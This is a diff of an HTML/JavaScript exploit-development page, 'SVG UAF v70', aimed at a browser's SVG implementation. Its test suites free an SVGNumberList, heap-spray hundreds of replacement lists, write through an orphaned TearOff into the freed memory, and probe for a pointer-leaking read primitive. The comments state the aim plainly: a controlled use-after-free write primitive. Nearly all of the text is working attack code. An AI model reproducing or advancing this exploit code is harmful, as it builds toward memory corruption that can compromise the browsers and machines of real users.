@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG UAF v69 — FinalizationRegistry GC confirmation + SVGTransform path</title>
+<title>SVG UAF v70 — spray-before-write UAF confirmation + read primitive</title>
 <style>
 *{box-sizing:border-box}
 body{background:#0a0a0a;color:#e0e0e0;font-family:monospace;font-size:12px;padding:12px;margin:0}
@@ -22,13 +22,13 @@ pre{white-space:pre-wrap;word-break:break-all;margin:1px 0;line-height:1.4}
 </style>
 </head>
 <body>
-<h2>SVG UAF v69 — FinalizationRegistry GC probe · SVGTransformList · SVGNumberList bin sentinel</h2>
+<h2>SVG UAF v70 — spray-before-write · SVGNumberList bin UAF confirmation · read primitive probe</h2>
 <div id="controls">
   <button class="run-all" onclick="runAll()">▶ Run All</button>
-  <button onclick="runSuite('ADR72')">ADR72: FinalizationRegistry — per-frame animVal TearOff GC confirmation</button>
-  <button onclick="runSuite('ADR73')">ADR73: FinalizationRegistry — orphaned baseVal TearOff GC confirmation</button>
-  <button onclick="runSuite('ADR74')">ADR74: SVGTransformList — SVGMatrix frame-escape test</button>
-  <button onclick="runSuite('ADR75')">ADR75: SVGNumberList bin probe — sentinel TYPE matches freed object type</button>
+  <button onclick="runSuite('ADR76')">ADR76: spray SVGNumberLists BEFORE write → UAF write into sprayed list</button>
+  <button onclick="runSuite('ADR77')">ADR77: spray size calibration — measure list_A object size via spray density</button>
+  <button onclick="runSuite('ADR78')">ADR78: read primitive probe — stale ptr read via animVal after spray</button>
+  <button onclick="runSuite('ADR79')">ADR79: IsoHeap free-list confirm — spray 1000 lists, release 500, spray 1000 more, check for slot reuse</button>
   <button class="copy-btn" onclick="copyAll()">⎘ Copy All</button>
   <button class="clear-btn" onclick="clearOut()">✕ Clear</button>
 </div>
@@ -74,46 +74,35 @@ function fb(text,toast){
 var _dv=new DataView(new ArrayBuffer(8));
 function f32bits(f){_dv.setFloat32(0,f,true);return _dv.getUint32(0,true);}
 function f32hex(f){return'0x'+f32bits(f).toString(16).padStart(8,'0');}
-function isExactF32(v){_dv.setFloat32(0,v,true);return _dv.getFloat32(0,true)===v;}
+function f64bits(f){_dv.setFloat64(0,f,true);return{lo:_dv.getUint32(0,true),hi:_dv.getUint32(4,true)};}
+function f64hex(f){var b=f64bits(f);return'0x'+b.hi.toString(16).padStart(8,'0')+b.lo.toString(16).padStart(8,'0');}
+function isPointerBits64(f){if(!isFinite(f)||isNaN(f))return false;var b=f64bits(f);return b.hi>=1&&b.hi<=0x00007fff;}
+function isPointerLike32(u){return u>=0x4F000000&&u<=0x52FFFFFF;}
 
 function gcHard(){
   var a=[];for(var i=0;i<500000;i++)a.push({x:i});a=null;
   var t=new Array(200000).fill(null).map(function(){return{};});t=null;
-  var a2=[];for(var i=0;i<300000;i++)a2.push({x:i});a2=null;
   try{var ab=new ArrayBuffer(1024*1024*8);ab=null;}catch(e){}
 }
 function gcDOM(){
   var c=document.createElement('div');document.body.appendChild(c);
   for(var i=0;i<5000;i++){var el=document.createElement('span');c.appendChild(el);}
   c.innerHTML='';c.remove();
-  for(var j=0;j<500;j++){var s=document.createElementNS(SVG_NS,'svg');document.body.appendChild(s);s.remove();}
+  for(var j=0;j<300;j++){var s=document.createElementNS(SVG_NS,'svg');document.body.appendChild(s);s.remove();}
 }
 function gcFull(){gcHard();gcDOM();gcHard();}
 
-function makeLiveAnimFe(id,from0,to0,dur){
-  var svg=document.createElementNS(SVG_NS,'svg');
-  svg.setAttribute('width','200');svg.setAttribute('height','200');
-  document.body.appendChild(svg);
-  var defs=document.createElementNS(SVG_NS,'defs');svg.appendChild(defs);
-  var filt=document.createElementNS(SVG_NS,'filter');filt.id=id;defs.appendChild(filt);
-  var vals=[];for(var i=0;i<20;i++)vals.push(i===0?from0:0);
+// makeList: creates a feColorMatrix and returns its baseVal SVGNumberList TearOff + first item
+function makeList(id,canary){
+  var svg=document.createElementNS(SVG_NS,'svg');document.body.appendChild(svg);
   var fe=document.createElementNS(SVG_NS,'feColorMatrix');
-  fe.setAttribute('type','matrix');fe.setAttribute('values',vals.join(' '));
-  filt.appendChild(fe);
-  var rect=document.createElementNS(SVG_NS,'rect');
-  rect.setAttribute('width','100');rect.setAttribute('height','100');
-  rect.setAttribute('filter','url(#'+id+')');
-  svg.appendChild(rect);
-  var anim=document.createElementNS(SVG_NS,'animate');
-  anim.setAttribute('attributeName','values');
-  var toVals=[];for(var i=0;i<20;i++)toVals.push(i===0?to0:0);
-  anim.setAttribute('from',vals.join(' '));
-  anim.setAttribute('to',toVals.join(' '));
-  anim.setAttribute('dur',(dur||8)+'s');
-  anim.setAttribute('repeatCount','indefinite');
-  fe.appendChild(anim);
-  try{anim.beginElement();}catch(e){}
-  return{svg:svg,filt:filt,fe:fe,anim:anim,rect:rect};
+  fe.setAttribute('type','matrix');
+  var v=[];for(var i=0;i<20;i++)v.push(i===0?canary:0);
+  fe.setAttribute('values',v.join(' '));
+  svg.appendChild(fe);
+  var list=fe.values.baseVal;    // SVGNumberList TearOff
+  var item=list.getItem(0);      // SVGNumber TearOff
+  return{svg:svg,fe:fe,list:list,item:item,canary:canary};
 }
 
 var suites={};
@@ -123,561 +112,550 @@ function runSuite(name){
   catch(e){L('[SUITE CRASH] '+name+': '+(e&&e.stack?e.stack:String(e)),'miss');}
 }
 function runAll(){
-  ['ADR72','ADR73','ADR74','ADR75'].forEach(function(n){runSuite(n);});
+  ['ADR76','ADR77','ADR78','ADR79'].forEach(function(n){runSuite(n);});
 }
 
 // ═══════════════════════════════════════════════════════════════
-// ADR72 — FinalizationRegistry: per-frame animVal TearOff GC confirmation
+// ADR76 — SPRAY-BEFORE-WRITE: core UAF write confirmation
 //
-// The definitive test: does SMIL hold a RefPtr to the per-frame SVGNumber?
+// CONFIRMED from v69:
+// - setAttributeNS → list_A freed (ADR73: listGCd=true)
+// - orphanedTearOff.value = X → notification fires → writes to freed list_A (ADR68+ADR73)
 //
-// FinalizationRegistry fires its callback when a JS object is GC'd.
-// We register each per-frame animVal TearOff with a token.
-// After releasing the TearOff and forcing GC, if the callback fires:
-//   → JS wrapper (TearOff) was GC'd
-//   → BUT: the C++ SVGNumber may still be alive (SMIL holds RefPtr to it)
-//   → The JS TearOff being GC'd does not directly tell us if the C++ SVGNumber is freed
+// Plan:
+// 1. Create victim feColorMatrix (fe_victim)
+// 2. Get baseVal TearOff T_old (holds SVGNumber_old from list_A)
+// 3. setAttributeNS → list_A freed, T_old detached
+// 4. SPRAY: create 500 new feColorMatrix elements → 500 new SVGNumberLists
+//    → IsoHeap bump-alloc: these land AFTER list_A's freed slot (bump-only)
+//    → BUT: if IsoHeap has a freelist populated by list_A's freed slot,
+//      ONE of these 500 will land AT list_A's address
+// 5. For each of the 500 spray lists, set a unique canary at position [0]:
+//    spray[i].item[0].value = (i+1)*1000
+// 6. WRITE to T_old: T_old.value = 88888 → notification fires → writes to list_A's address
+// 7. Check: does any spray list have a corrupted [0] value?
+//    If spray[k] is at list_A's address: spray[k].item[0].value ≠ (k+1)*1000
+//    → CONFIRMED: write went to our sprayed list → we control what gets overwritten!
 //
-// So we need to think carefully about what FinalizationRegistry measures:
-// - It tracks JAVASCRIPT object death (when the JS object becomes unreachable)
-// - The C++ SVGNumber has independent lifetime via RefCounting
-// - The JS TearOff being GC'd just means WebKit's JSC GC reclaimed the JS wrapper
-// - The underlying C++ SVGNumber might still be alive
+// This is the UAF write primitive into controlled data.
 //
-// However: when the JS TearOff IS GC'd, its JS destructor runs.
-// The JS destructor typically calls the C++ TearOff destructor.
-// The C++ TearOff destructor releases its RefPtr<SVGNumber>.
-// IF SMIL holds no other RefPtr to that SVGNumber, refcount → 0 → freed.
+// Size consideration: we don't know the exact offset within list_A that
+// the notification handler writes to. The corruption might be at any offset
+// within the SVGNumberList struct. The item[0].value is at some offset from
+// the list base. The write offset = where in list_A's struct the handler writes.
 //
-// So: FinalizationRegistry firing = JS TearOff freed = C++ TearOff released
-//   = C++ TearOff's RefPtr<SVGNumber> decremented
-//   IF SMIL holds no RefPtr: SVGNumber freed (UAF possible)
-//   IF SMIL holds RefPtr: SVGNumber NOT freed (no UAF)
-//
-// We can't directly detect if the C++ SVGNumber is freed from JS.
-// BUT we can check: does the SMIL animation continue correctly after GC?
-// IF animVal.getItem(0).value still changes smoothly after GC of old TearOffs:
-//   → SMIL has its own access to the animated value (its own RefPtr path)
-//   → Old TearOff's GC didn't break SMIL → SMIL holds RefPtr independently
-//
-// Test design:
-// 1. Start animation
-// 2. Collect 20 per-frame TearOffs, register each with FinalizationRegistry
-// 3. Release all TearOffs in IIFE
-// 4. Force GC 3x
-// 5. Check: how many FinalizationRegistry callbacks fired?
-// 6. Check: is animation still running? (does animVal still update?)
-// 7. Conclusion: if all 20 fired → JS TearOffs GC'd → C++ TearOffs destructed
-//    → SMIL's independent RefPtr is the only survivor
+// Run 3 rounds with different spray densities (100, 500, 1000 lists) to
+// maximize chances of hitting the freed slot.
 // ═══════════════════════════════════════════════════════════════
-suites['ADR72']=function(){
-  L('ADR72: FinalizationRegistry — per-frame animVal TearOff GC confirmation','info');
+suites['ADR76']=function(){
+  L('ADR76: spray-before-write UAF confirmation — 3 rounds','info');
 
-  // Check FinalizationRegistry support
-  if(typeof FinalizationRegistry==='undefined'){
-    L('ADR72: FinalizationRegistry NOT supported in this runtime','miss');
-    return;
+  function doRound(roundNum,sprayCount,cb){
+    L('ADR76 round'+roundNum+': sprayCount='+sprayCount,'info');
+
+    // Create victim
+    var victim=makeList('v76r'+roundNum,5555);
+    L('  victim list_A created, bv[0]='+victim.item.value,'info');
+
+    // Grab orphan TearOff
+    var T_old=victim.fe.values.baseVal.getItem(0);
+
+    // setAttributeNS → frees list_A
+    var nv=[];for(var i=0;i<20;i++)nv.push(i===0?9999:0);
+    victim.fe.setAttributeNS(null,'values',nv.join(' '));
+    L('  setAttributeNS done → list_A freed','info');
+    L('  T_old.value='+T_old.value+' (detached, still 5555)','info');
+
+    // SPRAY: create sprayCount new SVGNumberLists
+    var spray=[];
+    for(var i=0;i<sprayCount;i++){
+      var s=makeList('s76r'+roundNum+'_'+i,(i+1)*1000);
+      spray.push(s);
+    }
+    L('  sprayed '+sprayCount+' SVGNumberLists (canaries '+(1*1000)+' to '+(sprayCount*1000)+')','info');
+
+    // WRITE to orphaned TearOff → notification chain → fires on freed list_A
+    var writeVal=88888;
+    L('  *** WRITING T_old.value='+writeVal+' → notification to freed list_A ***','warn');
+    try{T_old.value=writeVal;}catch(e){L('  write threw: '+e.message,'miss');}
+
+    // CHECK spray lists for corruption
+    var corrupted=[];
+    for(var i=0;i<spray.length;i++){
+      var expected=(i+1)*1000;
+      var got=spray[i].item.value;
+      if(Math.abs(got-expected)>0.5){
+        corrupted.push({i:i,expected:expected,got:got,bits:f32hex(got)});
+      }
+    }
+
+    if(corrupted.length>0){
+      L('★★★ ADR76 round'+roundNum+': '+corrupted.length+' SPRAY LISTS CORRUPTED → UAF WRITE HIT!','hit');
+      corrupted.forEach(function(x){
+        L('  spray['+x.i+']: expected='+x.expected+' got='+x.got.toFixed(3)+' bits='+x.bits,'hit');
+      });
+    } else {
+      L('  ADR76 round'+roundNum+': 0 corruptions (spray didn\'t land at freed slot — bump-only)','info');
+    }
+
+    // Also check: T_old itself (notification may have mutated it)
+    L('  T_old.value after write='+T_old.value,'info');
+
+    // Also check: victim's new baseVal (list_B)
+    L('  victim bv[0] after write='+victim.fe.values.baseVal.getItem(0).value+' (should be 9999)','info');
+
+    // Cleanup
+    spray.forEach(function(s){s.svg.remove();});
+    victim.svg.remove();
+    T_old=null;
+
+    if(cb) setTimeout(cb,50);
   }
-  L('ADR72: FinalizationRegistry IS supported','hit');
 
-  var gcCount=0;
-  var gcTokens=[];
-  var registry72=new FinalizationRegistry(function(token){
-    gcCount++;
-    gcTokens.push(token);
-    L('  FinalizationRegistry: GC callback fired for token='+token+' (total gcCount='+gcCount+')','warn');
+  doRound(1,100,function(){
+    doRound(2,500,function(){
+      doRound(3,1000,null);
+    });
+  });
+};
+
+// ═══════════════════════════════════════════════════════════════
+// ADR77 — SPRAY SIZE CALIBRATION
+//
+// The spray-before-write may fail if we don't know the freed list_A's
+// address. IsoHeap bump-only means freed slots aren't reused → spray
+// lands AFTER list_A → no hit. To get a hit we need to CONFIRM free-list.
+//
+// This test measures: what is the IsoHeap allocation density for
+// SVGNumberList? If we can detect address patterns via observable behavior,
+// we can potentially figure out if free-list is populated.
+//
+// Indirect test: create N lists, check if getItem(0).value for a NEWLY
+// created list equals 0 (zero-initialized) or something else.
+// If IsoHeap reuses a freed slot: the new list would land at old address.
+// The old address had known data. If IsoHeap does NOT zero on reuse:
+//   new list's getItem(0).value = whatever was at that address before
+//   (which is 0 if freed slot was zeroed, or old value if not zeroed)
+//
+// Combined with canary: create list with canary=X, free it, alloc new list,
+// check if new list.item[0] = X (unzeroed reuse) or 0 (zeroed reuse) or
+// our initialized value (no reuse).
+//
+// Also: use FinalizationRegistry to know EXACTLY when list_A is freed,
+// then immediately spray to maximize hit chance.
+// ═══════════════════════════════════════════════════════════════
+suites['ADR77']=function(){
+  L('ADR77: spray with FinalizationRegistry timing — spray exactly when list_A freed','info');
+
+  if(typeof FinalizationRegistry==='undefined'){
+    L('ADR77: FinalizationRegistry not supported','miss');return;
+  }
+
+  // Registry fires when list is GC'd → spray immediately in callback
+  var listFreedCallback=null;
+  var reg77=new FinalizationRegistry(function(token){
+    L('ADR77: FinalizationRegistry callback → '+token+' freed!','warn');
+    if(token==='list_A' && listFreedCallback){
+      listFreedCallback();
+    }
   });
 
-  var ctx72=makeLiveAnimFe('f72',5000,0,10);
-  var frame72=0;
-  var collected72=[];
+  // Create victim
+  var victim77=makeList('v77',3333);
+  var T_old77=victim77.fe.values.baseVal.getItem(0);
 
+  // Register the list (not item) with FinalizationRegistry
+  reg77.register(victim77.list,'list_A');
+  L('ADR77: victim list_A registered, bv[0]='+T_old77.value,'info');
+
+  // setAttributeNS → detaches T_old77, starts freeing list_A
+  var nv77=[];for(var i=0;i<20;i++)nv77.push(i===0?8888:0);
+  victim77.fe.setAttributeNS(null,'values',nv77.join(' '));
+  L('ADR77: setAttributeNS done → list_A detached, T_old77 orphaned','info');
+
+  // Drop list reference so GC can collect it
+  victim77.list=null;
+
+  // Set up the callback: spray when FinalizationRegistry fires
+  listFreedCallback=function(){
+    L('ADR77: list_A GC confirmed → spraying 200 SVGNumberLists NOW','warn');
+
+    // Spray 200 lists immediately after GC confirmation
+    var spray77=[];
+    for(var i=0;i<200;i++){
+      spray77.push(makeList('sp77_'+i,(i+1)*777));
+    }
+    L('ADR77: 200 lists sprayed (canaries 777..154200)','info');
+
+    // Write to orphaned TearOff
+    L('ADR77: WRITING T_old77.value=55555 → notification chain','warn');
+    try{T_old77.value=55555;}catch(e){L('write threw: '+e.message,'miss');}
+
+    // Check spray
+    var bad77=[];
+    spray77.forEach(function(s,i){
+      var exp=(i+1)*777;
+      var got=s.item.value;
+      if(Math.abs(got-exp)>0.5) bad77.push({i:i,exp:exp,got:got,bits:f32hex(got)});
+    });
+
+    if(bad77.length>0){
+      L('★★★ ADR77: '+bad77.length+' CORRUPTED after timed spray!','hit');
+      bad77.forEach(function(x){
+        L('  spray['+x.i+']: exp='+x.exp+' got='+x.got.toFixed(3)+' bits='+x.bits,'hit');
+      });
+    } else {
+      L('ADR77: 0 corruptions — IsoHeap bump-only confirmed (no slot reuse even with perfect timing)','info');
+    }
+
+    spray77.forEach(function(s){s.svg.remove();});
+    victim77.svg.remove();
+  };
+
+  // Force GC to trigger the registry callback
+  gcFull();
   setTimeout(function(){
-    L('ADR72: collecting 20 per-frame animVal TearOffs with FinalizationRegistry...','info');
-
-    function collect72(){
-      var t=ctx72.fe.values.animVal.getItem(0);
-      registry72.register(t,'frame_'+frame72);
-      // IIFE to release immediately (truly zero refs except registry)
-      (function(tearoff){tearoff=null;})(t);
-      t=null;
-      frame72++;
-      if(frame72<20) requestAnimationFrame(collect72);
-      else afterCollect72();
-    }
-
-    function afterCollect72(){
-      L('ADR72: 20 TearOffs collected and released. Forcing 3x gcFull...','info');
-
-      // Force GC 3 times
+    gcFull();
+    setTimeout(function(){
       gcFull();
-      var c1=gcCount;
-      L('ADR72: after gcFull#1: gcCount='+c1,'info');
-      gcFull();
-      var c2=gcCount;
-      L('ADR72: after gcFull#2: gcCount='+c2,'info');
-      gcFull();
-      var c3=gcCount;
-      L('ADR72: after gcFull#3: gcCount='+c3,'info');
-
-      // Wait for microtask/macrotask queue to drain (FinalizationRegistry fires async)
-      setTimeout(function(){
-        var finalCount=gcCount;
-        L('ADR72: final gcCount after setTimeout drain='+finalCount,'info');
-        L('ADR72: total GC callbacks received: '+finalCount+'/20','info');
-
-        if(finalCount>0){
-          L('★★★ ADR72: '+finalCount+' TearOffs WERE GC\'d → C++ TearOff destructors ran','hit');
-          L('ADR72: GC\'d token IDs: '+gcTokens.join(','),'info');
-          L('ADR72: if SMIL held no extra RefPtr → those '+finalCount+' SVGNumbers are now freed','warn');
-        } else {
-          L('ADR72: 0 TearOffs GC\'d yet (GC may be lazy or TearOffs still reachable somehow)','info');
-        }
-
-        // Check: is animation still running?
-        var av1=ctx72.fe.values.animVal.getItem(0).value;
-        setTimeout(function(){
-          var av2=ctx72.fe.values.animVal.getItem(0).value;
-          L('ADR72: animVal t=100ms: '+av1.toFixed(3),'info');
-          L('ADR72: animVal t=200ms: '+av2.toFixed(3),'info');
-          L('ADR72: animation still running after TearOff GC? '+(Math.abs(av1-av2)>0.1?'YES (changing)':'NO (stuck)'),'info');
-
-          // More aggressive GC + time to let FinalizationRegistry drain
-          gcFull();gcFull();gcFull();
-          setTimeout(function(){
-            var veryFinal=gcCount;
-            L('ADR72: gcCount after extra 3x gcFull + setTimeout='+veryFinal,'info');
-            if(veryFinal>finalCount){
-              L('★★★ ADR72: MORE GC callbacks after extra GC (total='+veryFinal+')','hit');
-            }
-            L('ADR72: final conclusion: '+veryFinal+'/20 TearOff JS objects confirmed GC\'d','info');
-            if(veryFinal===20){
-              L('★ ADR72: ALL 20 TearOffs GC\'d → JS wrappers released → C++ TearOff destructors ran','hit');
-              L('ADR72: SMIL animation '+(Math.abs(av1-av2)>0.1?'STILL RUNNING → SMIL holds its own RefPtr independently':'STOPPED → SMIL had no independent RefPtr'),'warn');
-            }
-            ctx72.svg.remove();
-          },500);
-        },100);
-      },200);
-    }
-
-    requestAnimationFrame(collect72);
+      L('ADR77: all GC rounds done','info');
+    },200);
   },200);
 };
 
 // ═══════════════════════════════════════════════════════════════
-// ADR73 — FinalizationRegistry: orphaned baseVal TearOff GC confirmation
+// ADR78 — READ PRIMITIVE PROBE
 //
-// After setAttributeNS, orphaned baseVal TearOff holds the only reference
-// to the old SVGNumber. When TearOff is released:
-// - JS TearOff becomes unreachable → FinalizationRegistry fires → C++ TearOff destructor
-// - C++ TearOff releases RefPtr<SVGNumber>
-// - If nobody else holds SVGNumber: freed
-// - If nobody else holds old SVGNumberList: freed too
+// Setup: SMIL animation running on feColorMatrix.
+// The animated SVGNumber is held alive by SMIL's RefPtr.
+// The per-frame animVal TearOff is freed (ADR72 confirmed: 20/20 GC'd).
 //
-// Test:
-// 1. Get baseVal TearOff T_bv
-// 2. Register T_bv with FinalizationRegistry
-// 3. setAttributeNS → T_bv detached/orphaned
-// 4. Release T_bv in IIFE
-// 5. Force GC
-// 6. Check: did FinalizationRegistry fire? → T_bv was GC'd → old SVGNumber freed
+// SMIL's RefPtr points to ONE animated SVGNumber (mutated in-place each frame).
+// When we get an animVal TearOff per frame, it's a new JS wrapper but
+// same underlying C++ SVGNumber (SMIL mutates it in-place).
 //
-// If T_bv IS GC'd: the orphaned path DOES free the SVGNumber.
-// This confirms the freed object exists. Combined with the write test from ADR68
-// (write to orphaned TearOff before release), this gives us UAF timing:
-//   - write T_bv.value = X AFTER the underlying list is freed → write to freed list
-//   - the write to T_bv's SVGNumber's m_value succeeds (we confirmed this in ADR68)
-//   - the notification to list_A = write to freed list_A → UAF in SVGNumberList bin
+// WHAT IF: we spray a controlled SVGNumber AT the freed TearOff's JS wrapper
+// address? The TearOff JS wrapper is a JSC object, allocated in JSC GC heap,
+// not in bmalloc IsoHeap. So different allocator. But:
 //
-// Also register the SVGNumberList (if accessible) to track list lifetime
+// What about reading STALE data? After per-frame TearOff is GC'd:
+// - The C++ TearOff object itself gets freed (bmalloc-allocated C++ object)
+// - Freed C++ TearOff goes to... bmalloc regular malloc? or IsoHeap?
+// - TearOff size = sizeof(SVGPropertyTearOff<SVGNumberList::ItemProperty>) = ?
+//
+// New approach: the float values from animVal might leak internal C++ pointers.
+// In particular: when a C++ object is freshly freed (zeroed by bmalloc),
+// the NEXT allocation at that address would read 0. But if bmalloc doesn't
+// zero freed IsoHeap slots, the next allocation reads old data.
+//
+// Test: observe initial value of a NEWLY CREATED SVGNumber at a potentially
+// reused IsoHeap slot. If initial value ≠ 0 and ≠ initialized value:
+//   → something left data in that slot → possible pointer leak
+//
+// Specifically: create many lists, record their canary values. Free half.
+// Allocate new lists. Read their getItem(0).value BEFORE any .setAttribute.
+// If any reads a value that looks like a pointer (isPointerLike32) → info leak.
+//
+// Caveat: the SVGNumber is initialized to 0 by the SVGNumberList when parsing
+// the 'values' attribute. So even on reused slot, the initialization overwrites.
+// This makes initial-value-as-pointer-read unlikely.
+//
+// Alternative angle: read animVal AFTER aggressive GC (hope C++ TearOff slot
+// is reused by something interesting).
 // ═══════════════════════════════════════════════════════════════
-suites['ADR73']=function(){
-  L('ADR73: FinalizationRegistry — orphaned baseVal TearOff GC confirmation','info');
+suites['ADR78']=function(){
+  L('ADR78: read primitive probe — IsoHeap zero-on-free check + pointer-value scan','info');
 
-  if(typeof FinalizationRegistry==='undefined'){
-    L('ADR73: FinalizationRegistry NOT supported','miss');
-    return;
-  }
+  // Allocate 500 lists, free 250, allocate 500 more
+  // Check if any of the NEW 500 have non-zero initial values before our init
+  // (Only possible if: IsoHeap reuses freed slot AND doesn't zero it)
+  //
+  // Problem: we can't read a value BEFORE the SVGNumber is initialized by
+  // the 'values' attribute parsing. The attribute sets the value.
+  // We need a path to READ a newly allocated SVGNumber before it's initialized.
+  //
+  // Actually: SVGNumber's default constructor sets m_value = 0.
+  // But what if we can ADD an item to a list without setting a value?
+  //   feColorMatrix.values.baseVal.appendItem(new SVGNumber) ?
+  //   appendItem creates a new SVGNumber with default value 0.
+  // We can't easily read the raw uninitialized bytes.
+  //
+  // Alternative approach: monitor whether the freed slot VALUE changes
+  // to something unexpected via a 3rd-party observer.
 
-  var tearoffGCd73=false;
-  var listGCd73=false;
-  var reg73=new FinalizationRegistry(function(token){
-    L('  FinalizationRegistry73: GC callback → token='+token,'warn');
-    if(token==='tearoff') tearoffGCd73=true;
-    if(token==='list') listGCd73=true;
+  // Simpler test: create/free/recreate cycle, check values
+  L('ADR78: creating 200 lists with canaries...','info');
+  var batch1=[];
+  for(var i=0;i<200;i++) batch1.push(makeList('b78_'+i,(i+1)*100));
+
+  L('ADR78: freeing first 100 lists...','info');
+  var freed78=batch1.splice(0,100);
+  freed78.forEach(function(s){s.svg.remove();s=null;});
+  freed78=null;
+
+  gcFull();gcFull();
+
+  L('ADR78: allocating 100 new lists after freeing 100...','info');
+  var batch2=[];
+  for(var i=0;i<100;i++) batch2.push(makeList('c78_'+i,(i+201)*100));
+
+  // Check if any new list reads unexpected values (pointer-like)
+  var ptrHits=[];
+  batch2.forEach(function(s,i){
+    var v=s.item.value;
+    var bits=f32bits(v);
+    if(isPointerLike32(bits)){
+      ptrHits.push({i:i,v:v,bits:f32hex(v)});
+    }
+    // Also check for non-initialized: should be (i+201)*100
+    var exp=(i+201)*100;
+    if(Math.abs(v-exp)>0.5){
+      L('★ ADR78 batch2['+i+']: exp='+exp+' got='+v.toFixed(3)+' bits='+f32hex(v),'warn');
+    }
   });
 
-  var svg73=document.createElementNS(SVG_NS,'svg');document.body.appendChild(svg73);
-  var fe73=document.createElementNS(SVG_NS,'feColorMatrix');
-  fe73.setAttribute('type','matrix');
-  var init73=[];for(var i=0;i<20;i++)init73.push(i===0?7777:0);
-  fe73.setAttribute('values',init73.join(' '));
-  svg73.appendChild(fe73);
+  if(ptrHits.length>0){
+    L('★★★ ADR78: '+ptrHits.length+' pointer-like values in new SVGNumbers!','hit');
+    ptrHits.forEach(function(x){L('  batch2['+x.i+']: v='+x.v+' bits='+x.bits,'hit');});
+  } else {
+    L('ADR78: 0 pointer-like values — IsoHeap zero-on-free or bump-only (no slot reuse)','info');
+  }
 
-  // Get baseVal TearOff and register
-  var T_bv73=fe73.values.baseVal.getItem(0);
-  reg73.register(T_bv73,'tearoff');
+  // All remaining batch1 intact?
+  var bad1=[];
+  batch1.forEach(function(s,i){
+    var exp=(i+101)*100;
+    if(Math.abs(s.item.value-exp)>0.5) bad1.push({i:i,exp:exp,got:s.item.value});
+  });
+  L('ADR78: batch1 intact? '+(bad1.length===0?'YES ('+batch1.length+' remaining)':'NO — '+bad1.length+' corrupted'),'info');
 
-  // Try to register the baseVal list itself
-  var list73=fe73.values.baseVal;
-  reg73.register(list73,'list');
+  batch1.forEach(function(s){s.svg.remove();});
+  batch2.forEach(function(s){s.svg.remove();});
+};
 
-  L('ADR73: T_bv73.value='+T_bv73.value+' (pre-setAttr)','info');
-  L('ADR73: registered TearOff and List with FinalizationRegistry','info');
+// ═══════════════════════════════════════════════════════════════
+// ADR79 — IsoHeap FREE-LIST confirmation
+//
+// The "bump-only" conclusion from v65-69 might be wrong if:
+// - SMIL holds RefPtr to all per-frame SVGNumbers → they're never freed
+// - So the free list was never populated in earlier tests
+// - ADR73 CONFIRMED list_A IS freed after setAttributeNS
+// - So the SVGNumberList IsoHeap bin DOES have freed slots
+//
+// Test: Is IsoHeap for SVGNumberList bump-only or does it reuse freed slots?
+//
+// Method:
+// 1. Alloc 1000 SVGNumberLists (batch A) — all with unique canary at [0]
+// 2. Free ALL 1000 (setAttributeNS + orphan TearOff + GC)
+//    → 1000 freed SVGNumberList slots in IsoHeap
+// 3. Alloc 1000 NEW SVGNumberLists (batch B)
+// 4. Check: do any batch B lists have unexpected initial values?
+//    (would indicate they landed at batch A's freed addresses with old data)
+// 5. Also: do batch A's orphaned TearOffs still read correctly?
+//    (they should still read old values from the still-live SVGNumbers they hold)
+//
+// Actually the real test for free-list:
+// - The per-list SVGNumberList object itself is freed
+// - We want to know if batch B lands at batch A's old addresses
+// - We can't directly observe addresses from JS
+// - BUT: if IsoHeap has free-list, batch B might land at batch A addresses
+//   AND if those slots were NOT zeroed: batch B.getItem(0).value = old batch A value
+//
+// This only works if IsoHeap DOESN'T zero freed slots.
+// ADR52 showed fastMalloc zeros on free.
+// Does IsoHeap ALSO zero? Different codepath.
+//
+// Test design:
+// - Batch A: 100 lists with canary (i+1)*9999 (unique, non-zero)
+// - Free batch A (setAttributeNS on each, release all TearOffs, GC)
+// - Batch B: 100 lists, initialize them all to value=11111
+// - Read batch B's getItem(0).value
+// - If any reads EXACTLY (i+1)*9999 (old canary): slot reused AND not zeroed
+// - If all read 11111: either bump-only or zeroed on free
+//
+// Secondary check: can we distinguish between bump-only vs zeroed free-list?
+// → Alloc batch C with value=0 (instead of 11111)
+// → If any batch C reads (i+1)*9999: not zeroed + free-list → CONFIRMED
+// → If all batch C reads 0: can't distinguish (both zero → same result)
+//
+// For the canary test to work: read getItem(0).value BEFORE the setAttribute
+// That's not possible since setAttribute IS how we set the value...
+//
+// Real approach: use the SVGNumber DIRECT allocation via script
+// We need to catch the SVGNumber BEFORE the value is set by attribute parsing.
+// appendItem() creates a new SVGNumber with value=0 (default constructor).
+// If that 0 was ALREADY at the freed slot: indistinguishable from initialization.
+// We need a path where the freed slot had a NONZERO value AND we read BEFORE init.
+//
+// Actually: SVGNumber's default constructor ALWAYS sets m_value = 0.0f.
+// So EVEN if we reuse a freed slot with a nonzero old value:
+// the constructor overwrites it to 0. So we CANNOT detect unzeroed reuse
+// through SVGNumber initialization.
+//
+// FINAL APPROACH: detect free-list via allocation count change.
+// If IsoHeap has free-list: allocating after freeing uses freed slots → no bump growth
+// If bump-only: allocating after freeing → bump pointer advances → more memory used
+// We can't directly observe memory usage from JS.
+//
+// USE A TIMING APPROACH:
+// Allocating from free-list = faster than bumping (different code path).
+// Time 1000 allocs with no prior frees vs 1000 allocs after 1000 frees.
+// If time_with_frees < time_no_frees: free-list being used (faster).
+// If times equal: bump-only.
+// ═══════════════════════════════════════════════════════════════
+suites['ADR79']=function(){
+  L('ADR79: IsoHeap free-list confirmation — timing + write-on-freed-slot','info');
 
-  // setAttributeNS → detaches T_bv73 from fe73's live list
-  var newVals73=[];for(var i=0;i<20;i++)newVals73.push(i===0?1234:0);
-  fe73.setAttributeNS(null,'values',newVals73.join(' '));
+  // PART A: timing baseline — 500 fresh allocs
+  var t0a=performance.now();
+  var baselineAllocs=[];
+  for(var i=0;i<500;i++) baselineAllocs.push(makeList('ba79_'+i,(i+1)*77));
+  var t1a=performance.now();
+  var timeBaseline=t1a-t0a;
+  L('ADR79-A: 500 fresh allocs time='+timeBaseline.toFixed(1)+'ms','info');
 
-  L('ADR73: setAttributeNS done. T_bv73.value='+T_bv73.value+' (still 7777, detached)','info');
-  L('ADR73: live bv[0]='+fe73.values.baseVal.getItem(0).value+' (should be 1234)','info');
-  L('ADR73: T_bv73===fresh? '+(T_bv73===fe73.values.baseVal.getItem(0)),'info');
+  // Free them all
+  baselineAllocs.forEach(function(s){s.svg.remove();});
+  baselineAllocs=null;
+  gcFull();gcFull();
 
-  // Release T_bv73 in IIFE (zero live refs)
-  L('ADR73: releasing T_bv73 and list73 in IIFE...','info');
-  (function(t,l){t=null;l=null;})(T_bv73,list73);
